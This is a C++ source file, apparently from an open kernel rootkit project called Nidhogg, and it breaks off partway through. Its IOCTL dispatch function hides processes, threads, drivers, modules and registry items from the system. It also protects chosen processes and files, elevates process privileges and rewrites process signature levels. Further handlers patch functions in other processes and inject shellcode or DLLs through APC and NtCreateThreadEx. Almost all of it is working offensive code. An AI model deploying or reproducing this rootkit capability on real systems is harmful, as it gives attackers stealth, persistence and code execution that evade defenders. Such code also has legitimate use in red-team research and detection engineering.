#include "pch.h"
#include "IrpHandlers.h"

/*
* Description:
* NidhoggDeviceControl is responsible for handling IOCTLs and returning output to the user via IRPs.
* Every user communication should go through this function using the relevant IOCTL.
*
* Parameters:
* @DeviceObject [_Inout_ PDEVICE_OBJECT] -- Not used.
* @Irp			[_Inout_ PIRP]			 -- The IRP that contains the user data such as SystemBuffer, Irp stack, etc.
*
* Returns:
* @status		[NTSTATUS]			  -- Whether the function succeeded or not, if not the error code.
*/
NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);

	NTSTATUS status = STATUS_SUCCESS;
	SIZE_T len = 0;
	auto stack = IoGetCurrentIrpStackLocation(Irp);

	switch (stack->Parameters.DeviceIoControl.IoControlCode) {
	case IOCTL_PROTECT_UNPROTECT_PROCESS:
	{
		IoctlProcessEntry protectedProcess = { 0 };

		if (!Features.ProcessProtection) {
			Print(DRIVER_PREFIX "Due to previous error, process protection feature is unavaliable.\n");
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!IsValidSize(size, sizeof(IoctlProcessEntry))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = static_cast<IoctlProcessEntry*>(Irp->AssociatedIrp.SystemBuffer);
		protectedProcess.Pid = data->Pid;
		protectedProcess.Remove = data->Remove;

		if (!IsValidPid(protectedProcess.Pid)) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (protectedProcess.Remove) {
			if (!NidhoggProcessHandler->RemoveProcess(protectedProcess.Pid, ProcessType::Protected)) {
				status = STATUS_NOT_FOUND;
				break;
			}
			Print(DRIVER_PREFIX "Unprotecting process with pid %d.\n", protectedProcess.Pid);
		}
		else {
			if (!NidhoggProcessHandler->ProtectProcess(protectedProcess.Pid)) {
				status = STATUS_UNSUCCESSFUL;
				break;
			}
			Print(DRIVER_PREFIX "Protecting process with pid %d.\n", protectedProcess.Pid);
		}

		len += size;
		break;
	}

	case IOCTL_CLEAR_PROCESSES:
	{
		if (!Features.ProcessProtection) {
			Print(DRIVER_PREFIX "Due to previous error, process protection feature is unavaliable.\n");
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!IsValidSize(size, sizeof(ProcessType))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = static_cast<ProcessType*>(Irp->AssociatedIrp.SystemBuffer);

		switch (*data) {
		case ProcessType::Protected: {
			NidhoggProcessHandler->ClearProcessList(ProcessType::Protected);
			break;
		}
		case ProcessType::Hidden: {
			NidhoggProcessHandler->ClearProcessList(ProcessType::Hidden);
			break;
		}
		case ProcessType::All: {
			NidhoggProcessHandler->ClearProcessList(ProcessType::Protected);
			NidhoggProcessHandler->ClearProcessList(ProcessType::Hidden);
			break;
		}
		default: {
			status = STATUS_INVALID_PARAMETER;
			break;
		}
		}
		break;
	}

	case IOCTL_HIDE_UNHIDE_PROCESS:
	{
		IoctlProcessEntry hiddenProcess = { 0 };
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!IsValidSize(size, sizeof(IoctlProcessEntry))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = static_cast<IoctlProcessEntry*>(Irp->AssociatedIrp.SystemBuffer);
		hiddenProcess.Pid = data->Pid;
		hiddenProcess.Remove = data->Remove;

		if (!IsValidPid(hiddenProcess.Pid)) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (hiddenProcess.Remove) {
			status = NidhoggProcessHandler->UnhideProcess(hiddenProcess.Pid);

			if (NT_SUCCESS(status))
				Print(DRIVER_PREFIX "Unhide process with pid %d.\n", hiddenProcess.Pid);
		}
		else {
			status = NidhoggProcessHandler->HideProcess(hiddenProcess.Pid);

			if (NT_SUCCESS(status))
				Print(DRIVER_PREFIX "Hid process with pid %d.\n", hiddenProcess.Pid);
		}

		len += size;
		break;
	}

	case IOCTL_ELEVATE_PROCESS:
	{
		ULONG pid = 0;
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!IsValidSize(size, sizeof(ULONG))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = static_cast<ULONG*>(Irp->AssociatedIrp.SystemBuffer);
		pid = *data;

		if (!IsValidPid(pid)) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}
		status = NidhoggProcessHandler->ElevateProcess(pid);

		if (NT_SUCCESS(status))
			Print(DRIVER_PREFIX "Elevated process with pid %d.\n", pid);

		len += size;
		break;
	}

	case IOCTL_SET_PROCESS_SIGNATURE_LEVEL:
	{
		ProcessSignature processSignature = { 0 };
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!IsValidSize(size, sizeof(ProcessSignature))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = static_cast<ProcessSignature*>(Irp->AssociatedIrp.SystemBuffer);
		processSignature.Pid = data->Pid;
		processSignature.SignatureSigner = data->SignatureSigner;
		processSignature.SignerType = data->SignerType;

		if (!IsValidPid(processSignature.Pid) ||
			(processSignature.SignatureSigner < PsProtectedSignerNone || processSignature.SignatureSigner > PsProtectedSignerMax) ||
			(processSignature.SignerType < PsProtectedTypeNone || processSignature.SignerType > PsProtectedTypeProtected)) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}
		status = NidhoggProcessHandler->SetProcessSignature(&processSignature);

		if (NT_SUCCESS(status))
			Print(DRIVER_PREFIX "New signature applied to %d.\n", data->Pid);

		len += size;
		break;
	}

	case IOCTL_LIST_PROCESSES:
	{
		auto size = stack->Parameters.DeviceIoControl.OutputBufferLength;

		if (!IsValidSize(size, sizeof(IoctlProcessList))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<IoctlProcessList*>(Irp->AssociatedIrp.SystemBuffer);

		switch (data->Type) {
			case ProcessType::Protected: {
				if (!Features.ProcessProtection) {
					Print(DRIVER_PREFIX "Due to previous error, process protection feature is unavaliable.\n");
					status = STATUS_UNSUCCESSFUL;
					break;
				}
				status = NidhoggProcessHandler->ListProtectedProcesses(data) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
				break;
			}
			case ProcessType::Hidden: {
				status = NidhoggProcessHandler->ListHiddenProcesses(data) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
				break;
			}
			default: {
				status = STATUS_INVALID_PARAMETER;
				break;
			}
		}

		len += size;
		break;
	}

	case IOCTL_PROTECT_UNPROTECT_THREAD:
	{
		if (!Features.ThreadProtection) {
			Print(DRIVER_PREFIX "Due to previous error, thread protection feature is unavaliable.\n");
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!IsValidSize(size, sizeof(IoctlThreadEntry))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<IoctlThreadEntry*>(Irp->AssociatedIrp.SystemBuffer);

		if (data->Tid == 0) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (data->Remove) {
			status = NidhoggThreadHandler->RemoveThread(data->Tid, ThreadType::Protected) ?
				STATUS_SUCCESS : STATUS_NOT_FOUND;
			
			if (!NT_SUCCESS(status)) {
				Print(DRIVER_PREFIX "Failed to unprotect thread with tid %d.\n", data->Tid);
			}
			else {
				Print(DRIVER_PREFIX "Unprotecting thread with tid %d.\n", data->Tid);
			}
			break;
		}
		else {
			status = NidhoggThreadHandler->ProtectThread(data->Tid);

			if (!NT_SUCCESS(status)) {
				Print(DRIVER_PREFIX "Failed to protect thread with tid %d.\n", data->Tid);
			}
			else {
				Print(DRIVER_PREFIX "Protecting thread with tid %d.\n", data->Tid);
			}
		}

		len += size;
		break;
	}

	case IOCTL_HIDE_UNHIDE_THREAD:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!IsValidSize(size, sizeof(IoctlThreadEntry))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<IoctlThreadEntry*>(Irp->AssociatedIrp.SystemBuffer);

		if (data->Tid == 0) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (data->Remove) {
			status = NidhoggThreadHandler->UnhideThread(data->Tid);

			if (!NT_SUCCESS(status)) {
				Print(DRIVER_PREFIX "Failed to unhide thread with tid %d.\n", data->Tid);
			}
			else {
				Print(DRIVER_PREFIX "Unhiding thread with tid %d.\n", data->Tid);
			}
		}
		else {
			status = NidhoggThreadHandler->HideThread(data->Tid);

			if (!NT_SUCCESS(status)) {
				Print(DRIVER_PREFIX "Failed to hide thread with tid %d.\n", data->Tid);
				break;
			}
			else {
				Print(DRIVER_PREFIX "Hiding thread with tid %d.\n", data->Tid);
			}
		}

		len += size;
		break;
	}

	case IOCTL_CLEAR_THREADS:
	{
		if (!Features.ThreadProtection) {
			Print(DRIVER_PREFIX "Due to previous error, thread protection feature is unavaliable.\n");
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!IsValidSize(size, sizeof(ThreadType))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = static_cast<ThreadType*>(Irp->AssociatedIrp.SystemBuffer);

		switch (*data) {
			case ThreadType::Protected: {
				NidhoggThreadHandler->ClearThreadList(ThreadType::Protected);
				break;
			}
			case ThreadType::Hidden: {
				NidhoggThreadHandler->ClearThreadList(ThreadType::Hidden);
				break;
			}
			case ThreadType::All: {
				NidhoggThreadHandler->ClearThreadList(ThreadType::Protected);
				NidhoggThreadHandler->ClearThreadList(ThreadType::Hidden);
				break;
			}
			default: {
				status = STATUS_INVALID_PARAMETER;
				break;
			}
		}
		break;
	}

	case IOCTL_LIST_THREADS:
	{
		auto size = stack->Parameters.DeviceIoControl.OutputBufferLength;

		if (!IsValidSize(size, sizeof(IoctlThreadList))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<IoctlThreadList*>(Irp->AssociatedIrp.SystemBuffer);

		switch (data->Type) {
		case ThreadType::Protected: {
			if (!Features.ThreadProtection) {
				Print(DRIVER_PREFIX "Due to previous error, process protection feature is unavaliable.\n");
				status = STATUS_UNSUCCESSFUL;
				break;
			}
			status = NidhoggThreadHandler->ListProtectedThreads(data) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
			break;
		}
		case ThreadType::Hidden: {
			status = NidhoggThreadHandler->ListHiddenThreads(data) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
			break;
		}
		default: {
			status = STATUS_INVALID_PARAMETER;
			break;
		}
		}

		len += size;
		break;
	}

	case IOCTL_PROTECT_UNPROTECT_FILE:
	{
		ProtectedFile protectedFile{};

		if (!Features.FileProtection) {
			Print(DRIVER_PREFIX "Due to previous error, file protection feature is unavaliable.\n");
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!IsValidSize(size, sizeof(ProtectedFile))) {
			Print(DRIVER_PREFIX "Invalid buffer type.\n");
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<ProtectedFile*>(Irp->AssociatedIrp.SystemBuffer);
		protectedFile.Protect = data->Protect;
		SIZE_T filePathLen = wcslen(data->FilePath);

		MemoryAllocator<WCHAR*> allocator(&protectedFile.FilePath, MAX_PATH * sizeof(WCHAR));
		status = allocator.CopyData(data->FilePath, filePathLen * sizeof(WCHAR));

		if (!NT_SUCCESS(status))
			break;

		if (!protectedFile.FilePath || filePathLen > MAX_PATH) {
			Print(DRIVER_PREFIX "Buffer data is invalid.\n");
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (protectedFile.Protect) {
			if (!NidhoggFileHandler->ProtectFile(protectedFile.FilePath)) {
				Print(DRIVER_PREFIX "Failed to add file.\n");
				status = STATUS_UNSUCCESSFUL;
				break;
			}

			auto prevIrql = KeGetCurrentIrql();
			KeLowerIrql(PASSIVE_LEVEL);
			Print(DRIVER_PREFIX "Protecting file %ws.\n", protectedFile.FilePath);
			KeRaiseIrql(prevIrql, &prevIrql);
		}
		else {
			if (!NidhoggFileHandler->RemoveFile(protectedFile.FilePath, FileType::Protected)) {
				status = STATUS_NOT_FOUND;
				break;
			}

			auto prevIrql = KeGetCurrentIrql();
			KeLowerIrql(PASSIVE_LEVEL);
			Print(DRIVER_PREFIX "Unprotected file %ws.\n", protectedFile.FilePath);
			KeRaiseIrql(prevIrql, &prevIrql);
		}

		len += size;
		break;
	}

	case IOCTL_CLEAR_PROTECTED_FILES:
	{
		if (!Features.FileProtection) {
			Print(DRIVER_PREFIX "Due to previous error, file protection feature is unavaliable.\n");
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		NidhoggFileHandler->ClearFilesList(FileType::Protected);
		break;
	}

	case IOCTL_LIST_FILES:
	{
		auto size = stack->Parameters.DeviceIoControl.OutputBufferLength;

		if (!IsValidSize(size, sizeof(IoctlFileList))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<IoctlFileList*>(Irp->AssociatedIrp.SystemBuffer);

		switch (data->Type) {
		case FileType::Protected: {
			if (!Features.FileProtection) {
				Print(DRIVER_PREFIX "Due to previous error, file protection feature is unavaliable.\n");
				status = STATUS_UNSUCCESSFUL;
				break;
			}
			status = NidhoggFileHandler->ListProtectedFiles(data) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
			break;
		}
		default: {
			status = STATUS_INVALID_PARAMETER;
			break;
		}
		}

		len += size;
		break;
	}

	case IOCTL_PROTECT_REGITEM:
	{
		RegItem regItem{};
		ULONG itemsCount = 0;

		if (!Features.RegistryFeatures) {
			Print(DRIVER_PREFIX "Due to previous error, registry features are unavaliable.\n");
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!IsValidSize(size, sizeof(RegItem))) {
			Print(DRIVER_PREFIX "Invalid buffer type.\n");
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<RegItem*>(Irp->AssociatedIrp.SystemBuffer);
		regItem.Type = data->Type;
		SIZE_T keyLen = wcslen(data->KeyPath);

		if (keyLen == 0 || keyLen > REG_KEY_LEN) {
			Print(DRIVER_PREFIX "Buffer data is invalid.\n");
			status = STATUS_INVALID_PARAMETER;
			break;
		}
		errno_t err = wcsncpy_s(regItem.KeyPath, data->KeyPath, keyLen);

		if (err != 0) {
			Print(DRIVER_PREFIX "Failed to copy to buffer.\n");
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (regItem.Type == RegProtectedValue || regItem.Type == RegHiddenValue) {
			SIZE_T valueLen = wcslen(data->ValueName);

			if (valueLen == 0 || valueLen > REG_VALUE_LEN) {
				Print(DRIVER_PREFIX "Buffer data is invalid.\n");
				status = STATUS_INVALID_PARAMETER;
				break;
			}
			err = wcsncpy_s(regItem.ValueName, data->ValueName, valueLen);

			if (err != 0) {
				Print(DRIVER_PREFIX "Failed to copy to buffer.\n");
				status = STATUS_INVALID_PARAMETER;
				break;
			}
		}

		switch (regItem.Type) {
		case RegProtectedKey:
			itemsCount = NidhoggRegistryUtils->GetProtectedKeysCount();
			break;
		case RegHiddenKey:
			itemsCount = NidhoggRegistryUtils->GetHiddenKeysCount();
			break;
		case RegProtectedValue:
			itemsCount = NidhoggRegistryUtils->GetProtectedValuesCount();
			break;
		case RegHiddenValue:
			itemsCount = NidhoggRegistryUtils->GetHiddenValuesCount();
			break;
		default:
			Print(DRIVER_PREFIX "Unknown registry object type.\n");
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (!NT_SUCCESS(status))
			break;

		if (itemsCount == MAX_REG_ITEMS) {
			Print(DRIVER_PREFIX "List is full.\n");
			status = STATUS_TOO_MANY_CONTEXT_IDS;
			break;
		}

		if (!NidhoggRegistryUtils->FindRegItem(&regItem)) {
			if (!NidhoggRegistryUtils->AddRegItem(&regItem)) {
				Print(DRIVER_PREFIX "Failed to add new registry item.\n");
				status = STATUS_UNSUCCESSFUL;
				break;
			}
			Print(DRIVER_PREFIX "Added new registry item of type %d.\n", regItem.Type);
		}

		len += size;
		break;
	}

	case IOCTL_UNPROTECT_REGITEM:
	{
		RegItem regItem{};

		if (!Features.RegistryFeatures) {
			Print(DRIVER_PREFIX "Due to previous error, registry features are unavaliable.\n");
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!IsValidSize(size, sizeof(RegItem))) {
			Print(DRIVER_PREFIX "Invalid buffer type.\n");
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		auto data = static_cast<RegItem*>(Irp->AssociatedIrp.SystemBuffer);
		regItem.Type = data->Type;
		SIZE_T keyLen = wcslen(data->KeyPath);

		if (!VALID_REG_TYPE(regItem.Type) || keyLen == 0 || keyLen > REG_KEY_LEN) {
			Print(DRIVER_PREFIX "Buffer data is invalid.\n");
			status = STATUS_INVALID_PARAMETER;
			break;
		}
		errno_t err = wcsncpy_s(regItem.KeyPath, data->KeyPath, keyLen);

		if (err != 0) {
			Print(DRIVER_PREFIX "Failed to copy to buffer.\n");
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (regItem.Type == RegProtectedValue || regItem.Type == RegHiddenValue) {
			SIZE_T valueLen = wcslen(data->ValueName);

			if (valueLen == 0 || valueLen > REG_VALUE_LEN) {
				Print(DRIVER_PREFIX "Buffer data is invalid.\n");
				status = STATUS_INVALID_PARAMETER;
				break;
			}
			err = wcsncpy_s(regItem.ValueName, data->ValueName, valueLen);

			if (err != 0) {
				Print(DRIVER_PREFIX "Failed to copy to buffer.\n");
				status = STATUS_INVALID_PARAMETER;
				break;
			}
		}

		if (!NidhoggRegistryUtils->RemoveRegItem(&regItem)) {
			Print(DRIVER_PREFIX "Registry item not found.\n");
			status = STATUS_NOT_FOUND;
			break;
		}

		len += size;
		break;
	}

	case IOCTL_CLEAR_REGITEMS:
	{
		if (!Features.RegistryFeatures) {
			Print(DRIVER_PREFIX "Due to previous error, registry features are unavaliable.\n");
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		NidhoggRegistryUtils->ClearRegItems();
		break;
	}

	case IOCTL_LIST_REGITEMS:
	{
		ULONG itemsCount = 0;

		if (!Features.RegistryFeatures) {
			Print(DRIVER_PREFIX "Due to previous error, registry features are unavaliable.\n");
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!IsValidSize(size, sizeof(RegItem))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<RegItem*>(Irp->AssociatedIrp.SystemBuffer);

		switch (data->Type) {
		case RegProtectedKey:
			itemsCount = NidhoggRegistryUtils->GetProtectedKeysCount();
			break;
		case RegHiddenKey:
			itemsCount = NidhoggRegistryUtils->GetHiddenKeysCount();
			break;
		case RegProtectedValue: {
			itemsCount = NidhoggRegistryUtils->GetProtectedValuesCount();
			break;
		}
		case RegHiddenValue: {
			itemsCount = NidhoggRegistryUtils->GetHiddenValuesCount();
			break;
		}
		default:
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (!NT_SUCCESS(status) || data->RegItemsIndex > itemsCount) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (itemsCount > 0)
			status = NidhoggRegistryUtils->QueryRegItem(data);

		len += size;
		break;
	}

	case IOCTL_PATCH_MODULE:
	{
		PatchedModule patchedModule{};

		if (!Features.FunctionPatching) {
			Print(DRIVER_PREFIX "Due to previous error, function patching feature is unavaliable.\n");
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!IsValidSize(size, sizeof(PatchedModule))) {
			Print(DRIVER_PREFIX "Invalid buffer type.\n");
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<PatchedModule*>(Irp->AssociatedIrp.SystemBuffer);
		patchedModule.Pid = data->Pid;
		patchedModule.PatchLength = data->PatchLength;
		SIZE_T strSize = strlen(data->FunctionName);

		MemoryAllocator<CHAR*> functionNameAllocator(&patchedModule.FunctionName, strSize);
		status = functionNameAllocator.CopyData(data->FunctionName, strSize);

		if (!NT_SUCCESS(status))
			break;

		strSize = wcslen(data->ModuleName) * sizeof(WCHAR);
		MemoryAllocator<WCHAR*> moduleNameAllocator(&patchedModule.ModuleName, strSize);
		status = moduleNameAllocator.CopyData(data->ModuleName, strSize);

		if (!NT_SUCCESS(status))
			break;

		MemoryAllocator<PVOID> patchAllocator(&patchedModule.Patch, data->PatchLength);
		status = patchAllocator.CopyData(data->Patch, data->PatchLength);

		if (!NT_SUCCESS(status))
			break;

		if (!IsValidPid(data->Pid)) {
			Print(DRIVER_PREFIX "Invalid PID.\n");
			status = STATUS_INVALID_PARAMETER;
			break;
		}
		status = NidhoggMemoryUtils->PatchModule(&patchedModule);

		if (NT_SUCCESS(status)) {
			auto prevIrql = KeGetCurrentIrql();
			KeLowerIrql(PASSIVE_LEVEL);
			Print(DRIVER_PREFIX "Patched module %ws and function %s for process %d.\n", patchedModule.ModuleName, patchedModule.FunctionName, patchedModule.Pid);
			KeRaiseIrql(prevIrql, &prevIrql);
		}

		len += size;
		break;
	}

	case IOCTL_HIDE_MODULE:
	{
		HiddenModuleInformation hiddenModule{};

		if (!Features.ModuleHiding) {
			Print(DRIVER_PREFIX "Due to previous error, hiding module feature is unavaliable.\n");
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!IsValidSize(size, sizeof(HiddenModuleInformation))) {
			Print(DRIVER_PREFIX "Invalid buffer type.\n");
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<HiddenModuleInformation*>(Irp->AssociatedIrp.SystemBuffer);
		hiddenModule.Pid = data->Pid;
		SIZE_T moduleNameSize = wcslen(data->ModuleName) * sizeof(WCHAR);

		MemoryAllocator<WCHAR*> moduleNameAllocator(&hiddenModule.ModuleName, moduleNameSize);
		status = moduleNameAllocator.CopyData(data->ModuleName, moduleNameSize);

		if (!NT_SUCCESS(status))
			break;

		if (!IsValidPid(hiddenModule.Pid)) {
			Print(DRIVER_PREFIX "Buffer is invalid.\n");
			status = STATUS_INVALID_PARAMETER;
			break;
		}
		status = NidhoggMemoryUtils->HideModule(&hiddenModule);

		if (NT_SUCCESS(status)) {
			auto prevIrql = KeGetCurrentIrql();
			KeLowerIrql(PASSIVE_LEVEL);
			Print(DRIVER_PREFIX "Hid module %ws for process %d.\n", hiddenModule.ModuleName, hiddenModule.Pid);
			KeRaiseIrql(prevIrql, &prevIrql);
		}

		len += size;
		break;
	}

	case IOCTL_HIDE_UNHIDE_DRIVER:
	{
		HiddenDriverInformation hiddenDriver{};
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!IsValidSize(size, sizeof(HiddenDriverInformation))) {
			Print(DRIVER_PREFIX "Invalid buffer type.\n");
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<HiddenDriverInformation*>(Irp->AssociatedIrp.SystemBuffer);
		hiddenDriver.Hide = data->Hide;
		SIZE_T driverNameSize = (wcslen(data->DriverName) + 1) * sizeof(WCHAR);

		MemoryAllocator<WCHAR*> driverNameAllocator(&hiddenDriver.DriverName, driverNameSize);
		status = driverNameAllocator.CopyData(data->DriverName, driverNameSize);

		if (!NT_SUCCESS(status)) {
			Print(DRIVER_PREFIX "Buffer is invalid.\n");
			break;
		}

		if (hiddenDriver.Hide) {
			if (NidhoggMemoryUtils->GetHiddenDrivers() == MAX_HIDDEN_DRIVERS) {
				Print(DRIVER_PREFIX "Too many items.\n");
				status = STATUS_TOO_MANY_CONTEXT_IDS;
				break;
			}

			status = NidhoggMemoryUtils->HideDriver(&hiddenDriver);

			if (NT_SUCCESS(status)) {
				auto prevIrql = KeGetCurrentIrql();
				KeLowerIrql(PASSIVE_LEVEL);
				Print(DRIVER_PREFIX "Hid driver %ws.\n", hiddenDriver.DriverName);
				KeRaiseIrql(prevIrql, &prevIrql);
			}
		}
		else {
			status = NidhoggMemoryUtils->UnhideDriver(&hiddenDriver);

			if (NT_SUCCESS(status)) {
				auto prevIrql = KeGetCurrentIrql();
				KeLowerIrql(PASSIVE_LEVEL);
				Print(DRIVER_PREFIX "Restored driver %ws.\n", hiddenDriver.DriverName);
				KeRaiseIrql(prevIrql, &prevIrql);
			}
		}

		len += size;
		break;
	}

	case IOCTL_INJECT_SHELLCODE:
	{
		ShellcodeInformation shellcodeInfo{};
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!IsValidSize(size, sizeof(ShellcodeInformation))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<ShellcodeInformation*>(Irp->AssociatedIrp.SystemBuffer);
		shellcodeInfo.Pid = data->Pid;

		if (!IsValidPid(shellcodeInfo.Pid)) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		shellcodeInfo.Type = data->Type;
		shellcodeInfo.ShellcodeSize = data->ShellcodeSize;
		shellcodeInfo.Parameter1 = NULL;
		shellcodeInfo.Parameter1Size = data->Parameter1Size;
		shellcodeInfo.Parameter2 = NULL;
		shellcodeInfo.Parameter2Size = data->Parameter2Size;
		shellcodeInfo.Parameter3 = NULL;
		shellcodeInfo.Parameter3Size = data->Parameter3Size;

		MemoryAllocator<PVOID> shellcodeAllocator(&shellcodeInfo.Shellcode, shellcodeInfo.ShellcodeSize);
		status = shellcodeAllocator.CopyData(data->Shellcode, shellcodeInfo.ShellcodeSize);

		if (!NT_SUCCESS(status))
			break;

		// Copy parameters
		if (shellcodeInfo.Parameter1Size > 0) {
			MemoryAllocator<PVOID> parameter1Alloc(&shellcodeInfo.Parameter1, shellcodeInfo.Parameter1Size);
			status = parameter1Alloc.CopyData(data->Parameter1, shellcodeInfo.Parameter1Size);

			if (!NT_SUCCESS(status))
				break;
		}

		if (shellcodeInfo.Parameter2Size > 0) {
			MemoryAllocator<PVOID> parameter2Alloc(&shellcodeInfo.Parameter2, shellcodeInfo.Parameter2Size);
			status = parameter2Alloc.CopyData(data->Parameter2, shellcodeInfo.Parameter2Size);

			if (!NT_SUCCESS(status))
				break;
		}

		if (shellcodeInfo.Parameter3Size > 0) {
			MemoryAllocator<PVOID> parameter3Alloc(&shellcodeInfo.Parameter3, shellcodeInfo.Parameter3Size);
			status = parameter3Alloc.CopyData(data->Parameter3, shellcodeInfo.Parameter3Size);

			if (!NT_SUCCESS(status))
				break;
		}

		switch (shellcodeInfo.Type) {
		case APCInjection: {
			if (!Features.ApcInjection) {
				Print(DRIVER_PREFIX "Due to previous error, APC shellcode injection feature is unavaliable.\n");
				status = STATUS_UNSUCCESSFUL;
				break;
			}

			status = NidhoggMemoryUtils->InjectShellcodeAPC(&shellcodeInfo);
			break;
		}
		case NtCreateThreadExInjection: {
			if (!Features.CreateThreadInjection) {
				Print(DRIVER_PREFIX "Due to previous error, NtCreateThreadEx shellcode injection feature is unavaliable.\n");
				status = STATUS_UNSUCCESSFUL;
				break;
			}

			status = NidhoggMemoryUtils->InjectShellcodeThread(&shellcodeInfo);
			break;
		}
		default:
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		NT_SUCCESS(status) ? Print(DRIVER_PREFIX "Shellcode injected successfully.\n") :
			Print(DRIVER_PREFIX "Failed to inject shellcode (0x%08X)\n", status);

		len += size;
		break;
	}

	case IOCTL_INJECT_DLL:
	{
		DllInformation dllInfo{};
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!IsValidSize(size, sizeof(DllInformation))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<DllInformation*>(Irp->AssociatedIrp.SystemBuffer);
		dllInfo.Pid = data->Pid;
		dllInfo.Type = data->Type;
		SIZE_T dllPathSize = strlen(data->DllPath);

		if (dllPathSize > MAX_PATH) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		errno_t err = strcpy_s(dllInfo.DllPath, data->DllPath);

		if (err != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		if (!IsValidPid(dllInfo.Pid)) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		switch (dllInfo.Type) {
		case APCInjection: {
			if (!Features.ApcInjection) {
				Print(DRIVER_PREFIX "Due to previous error, APC dll injection feature is unavaliable.\n");
				status = STATUS_UNSUCCESSFUL;
				break;
			}

			status = NidhoggMemoryUtils->InjectDllAPC(&dllInfo);
			break;
		}
		case NtCreateThreadExInjection: {
			if (!Features.CreateThreadInjection) {
				Print(DRIVER_PREFIX "Due to previous error, NtCreateThreadEx dll injection feature is unavaliable.\n");
				status = STATUS_UNSUCCESSFUL;
				break;
			}

			status = NidhoggMemoryUtils->InjectDllThread(&dllInfo);
			break;
		}
		default:
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		NT_SUCCESS(status) ? Print(DRIVER_PREFIX "DLL injected successfully.\n") :
			Print(DRIVER_PREFIX "Failed to inject DLL (0x%08X)\n", status);

		len += size;
		break;
	}

	case IOCTL_LIST_OBCALLBACKS:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (!IsValidSize(size, sizeof(ObCallbacksList))) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<ObCallbacksList*>(Irp->AssociatedIrp.SystemBuffer);

